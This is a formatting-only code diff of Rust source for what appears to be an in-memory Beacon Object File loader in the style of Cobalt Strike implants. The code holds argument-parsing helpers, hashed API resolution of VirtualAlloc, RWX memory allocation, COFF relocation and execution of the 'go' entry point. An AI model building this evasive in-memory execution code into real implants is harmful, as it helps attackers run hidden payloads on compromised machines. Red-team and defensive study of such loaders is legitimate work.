@@ -94,7 +94,9 @@ pub unsafe extern "C" fn BeaconPrintf(_type: i32, fmt: *const u8, _args: *const 
 
 #[no_mangle]
 pub unsafe extern "C" fn BeaconDataParse(parser: *mut datap, data: *const u8, size: u32) {
-    if parser.is_null() || data.is_null() { return; }
+    if parser.is_null() || data.is_null() {
+        return;
+    }
     (*parser).buffer = data;
     (*parser).length = size;
     (*parser).size = size;
@@ -103,7 +105,9 @@ pub unsafe extern "C" fn BeaconDataParse(parser: *mut datap, data: *const u8, si
 
 #[no_mangle]
 pub unsafe extern "C" fn BeaconDataInt(parser: *mut datap) -> i32 {
-    if parser.is_null() || (*parser).offset + 4 > (*parser).length { return 0; }
+    if parser.is_null() || (*parser).offset + 4 > (*parser).length {
+        return 0;
+    }
     let ptr = (*parser).buffer.add((*parser).offset as usize);
     let val = i32::from_be_bytes(*(ptr as *const [u8; 4]));
     (*parser).offset += 4;
@@ -112,7 +116,9 @@ pub unsafe extern "C" fn BeaconDataInt(parser: *mut datap) -> i32 {
 
 #[no_mangle]
 pub unsafe extern "C" fn BeaconDataShort(parser: *mut datap) -> i16 {
-    if parser.is_null() || (*parser).offset + 2 > (*parser).length { return 0; }
+    if parser.is_null() || (*parser).offset + 2 > (*parser).length {
+        return 0;
+    }
     let ptr = (*parser).buffer.add((*parser).offset as usize);
     let val = i16::from_be_bytes(*(ptr as *const [u8; 2]));
     (*parser).offset += 2;
@@ -121,21 +127,27 @@ pub unsafe extern "C" fn BeaconDataShort(parser: *mut datap) -> i16 {
 
 #[no_mangle]
 pub unsafe extern "C" fn BeaconDataLength(parser: *mut datap) -> i32 {
-    if parser.is_null() { return 0; }
+    if parser.is_null() {
+        return 0;
+    }
     ((*parser).length - (*parser).offset) as i32
 }
 
 #[no_mangle]
 pub unsafe extern "C" fn BeaconDataExtract(parser: *mut datap, size: *mut i32) -> *mut u8 {
-    if parser.is_null() || (*parser).offset + 4 > (*parser).length { return core::ptr::null_mut(); }
-    
+    if parser.is_null() || (*parser).offset + 4 > (*parser).length {
+        return core::ptr::null_mut();
+    }
+
     // Read length of following data (CS format uses 4-byte big-endian length)
     let len_ptr = (*parser).buffer.add((*parser).offset as usize);
     let data_len = u32::from_be_bytes(*(len_ptr as *const [u8; 4]));
     (*parser).offset += 4;
 
-    if (*parser).offset + data_len > (*parser).length { return core::ptr::null_mut(); }
-    
+    if (*parser).offset + data_len > (*parser).length {
+        return core::ptr::null_mut();
+    }
+
     let data_ptr = (*parser).buffer.add((*parser).offset as usize) as *mut u8;
     if !size.is_null() {
         *size = data_len as i32;
@@ -165,40 +177,46 @@ impl BofLoader {
             if self.raw_data.len() < core::mem::size_of::<CoffHeader>() {
                 return Err(());
             }
-            
+
             let header = &*(base as *const CoffHeader);
             if header.machine != IMAGE_FILE_MACHINE_AMD64 {
                 return Err(());
             }
 
             // 1. Resolve Sections
-            let section_table_offset = core::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
+            let section_table_offset =
+                core::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
             let mut section_mappings = Vec::new();
-            
+
             let kernel32 = hash_str(b"kernel32.dll");
             let virtual_alloc = resolve_function(kernel32, hash_str(b"VirtualAlloc"));
-            if virtual_alloc.is_null() { return Err(()); }
-            
+            if virtual_alloc.is_null() {
+                return Err(());
+            }
+
             type FnVirtualAlloc = unsafe extern "system" fn(PVOID, usize, u32, u32) -> PVOID;
             let bof_mem = core::mem::transmute::<_, FnVirtualAlloc>(virtual_alloc)(
                 core::ptr::null_mut(),
                 self.raw_data.len() * 4, // Enough space
                 0x3000,
-                0x40
+                0x40,
             );
-            if bof_mem.is_null() { return Err(()); }
+            if bof_mem.is_null() {
+                return Err(());
+            }
 
             // Copy sections
             for i in 0..header.number_of_sections {
-                let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
+                let offset =
+                    section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                 let section = &*(base.add(offset) as *const SectionHeader);
-                
+
                 let dest = (bof_mem as usize + (i as usize * 4096)) as *mut u8;
                 if section.pointer_to_raw_data != 0 {
                     core::ptr::copy_nonoverlapping(
                         base.add(section.pointer_to_raw_data as usize),
                         dest,
-                        section.size_of_raw_data as usize
+                        section.size_of_raw_data as usize,
                     );
                 }
                 section_mappings.push(dest);
@@ -209,21 +227,23 @@ impl BofLoader {
             let string_table = sym_table.add(header.number_of_symbols as usize) as *const u8;
 
             for i in 0..header.number_of_sections {
-                let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
+                let offset =
+                    section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                 let section = &*(base.add(offset) as *const SectionHeader);
-                
+
                 let relocs = base.add(section.pointer_to_relocations as usize) as *const Relocation;
                 let section_base = section_mappings[i as usize] as usize;
 
                 for j in 0..section.number_of_relocations {
                     let reloc = &*relocs.add(j as usize);
                     let symbol = &*sym_table.add(reloc.symbol_table_index as usize);
-                    
+
                     let mut sym_addr: usize = 0;
-                    
+
                     if symbol.section_number > 0 {
                         // Internal symbol
-                        let target_section_base = section_mappings[(symbol.section_number - 1) as usize] as usize;
+                        let target_section_base =
+                            section_mappings[(symbol.section_number - 1) as usize] as usize;
                         sym_addr = target_section_base + symbol.value as usize;
                     } else {
                         // External Symbol
@@ -237,7 +257,8 @@ impl BofLoader {
 
                         // Calculate name length
                         let mut name_len = 0;
-                        while *name_ptr.add(name_len) != 0 && name_len < 64 { // Cap check
+                        while *name_ptr.add(name_len) != 0 && name_len < 64 {
+                            // Cap check
                             name_len += 1;
                         }
                         let name_slice = core::slice::from_raw_parts(name_ptr, name_len);
@@ -296,10 +317,14 @@ impl BofLoader {
                     let offset = u32::from_le_bytes(symbol.name[4..8].try_into().unwrap());
                     let p = string_table.add(offset as usize);
                     let mut l = 0;
-                    while *p.add(l) != 0 { l+=1; }
+                    while *p.add(l) != 0 {
+                        l += 1;
+                    }
                     core::str::from_utf8(core::slice::from_raw_parts(p, l)).unwrap_or("")
                 } else {
-                    core::str::from_utf8(&symbol.name).unwrap_or("").trim_matches(char::from(0))
+                    core::str::from_utf8(&symbol.name)
+                        .unwrap_or("")
+                        .trim_matches(char::from(0))
                 };
 
                 if name == "go" {
@@ -316,7 +341,9 @@ impl BofLoader {
 
     #[cfg(not(target_os = "windows"))]
     pub fn load_and_run(&self) -> Result<(), ()> {
-        if self.raw_data.is_empty() { return Err(()); }
+        if self.raw_data.is_empty() {
+            return Err(());
+        }
         Err(())
     }
 }
